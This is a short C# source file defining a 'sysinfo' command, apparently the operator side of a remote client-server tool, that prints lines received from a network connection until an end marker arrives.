﻿using System;
using System.Collections.Generic;
using Client.Commands.Core;

namespace Client.Commands
{
    internal class SysInfo : IClientCommand
    {
        public string name { get; } = "sysinfo";

        public string description { get; } = "Display the remote system's informations";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = null;


        public void Process(List<string> args)
        {
            var data = "";
            while (data != "{end}")
            {
                if (data != "")
                    Console.WriteLine(data);
                data = ClientCommandsManager.networkManager.ReadLine();
            }
        }
    }
}
